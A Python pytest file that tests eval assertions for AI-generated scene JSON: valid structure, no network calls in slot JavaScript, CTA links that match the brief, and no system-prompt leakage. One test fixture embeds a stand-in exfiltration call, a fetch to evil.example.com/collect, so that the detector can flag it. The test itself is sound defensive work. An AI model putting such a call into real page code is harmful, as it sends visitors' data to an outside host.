"""Assertion functions run against synthetic output, no model call — the one
thing this suite can verify without a live OpenRouter key (evals/provider.py
is where the real call would happen, and is out of scope for a pytest run).
"""

import json

from evals import assertions
from schema.scene import CtaProps, HeadlineProps, SlotProps

CTA_HREF = "https://example.com/trial"
BRIEF = {"cta": {"href": CTA_HREF}}


def _output(scenes: list[dict[str, object]], errors: list[dict[str, object]]) -> str:
    return json.dumps({"scenes": scenes, "errors": errors, "brief": BRIEF})


def _scene(*props: object) -> dict[str, object]:
    return {
        "id": "s1",
        "intent": "hook",
        "layout": "centered",
        "blocks": [{"id": f"b{i}", "props": p} for i, p in enumerate(props)],
    }


def test_valid_scene_json_true_with_scenes() -> None:
    scene = _scene(HeadlineProps(type="headline", text="Ship it").model_dump())
    assert assertions.valid_scene_json(_output([scene], []), None) is True


def test_valid_scene_json_true_with_only_errors() -> None:
    output = _output([], [{"index": 0, "code": "refused", "message": "declined"}])
    assert assertions.valid_scene_json(output, None) is True


def test_valid_scene_json_false_when_empty() -> None:
    assert assertions.valid_scene_json(_output([], []), None) is False


def test_no_slot_network_calls_flags_fetch() -> None:
    scene = _scene(
        SlotProps(
            type="slot",
            description="demo",
            js="fetch('https://evil.example.com/collect')",
            height="auto",
        ).model_dump()
    )
    assert assertions.no_slot_network_calls(_output([scene], []), None) is False


def test_no_slot_network_calls_true_for_plain_slot() -> None:
    scene = _scene(
        SlotProps(
            type="slot", description="demo", js="console.log(1)", height="auto"
        ).model_dump()
    )
    assert assertions.no_slot_network_calls(_output([scene], []), None) is True


def test_hrefs_trace_to_brief_flags_mismatch() -> None:
    scene = _scene(
        CtaProps(
            type="cta", label="Go", href="https://evil.example.com", style="primary"
        ).model_dump()
    )
    assert assertions.hrefs_trace_to_brief(_output([scene], []), None) is False


def test_hrefs_trace_to_brief_true_when_matching() -> None:
    scene = _scene(
        CtaProps(type="cta", label="Go", href=CTA_HREF, style="primary").model_dump()
    )
    assert assertions.hrefs_trace_to_brief(_output([scene], []), None) is True


def test_no_prompt_leak_flags_fragment() -> None:
    scene = _scene(
        HeadlineProps(type="headline", text="You are the Build phase").model_dump()
    )
    assert assertions.no_prompt_leak(_output([scene], []), None) is False


def test_no_prompt_leak_true_for_ordinary_copy() -> None:
    scene = _scene(HeadlineProps(type="headline", text="Ship it today").model_dump())
    assert assertions.no_prompt_leak(_output([scene], []), None) is True
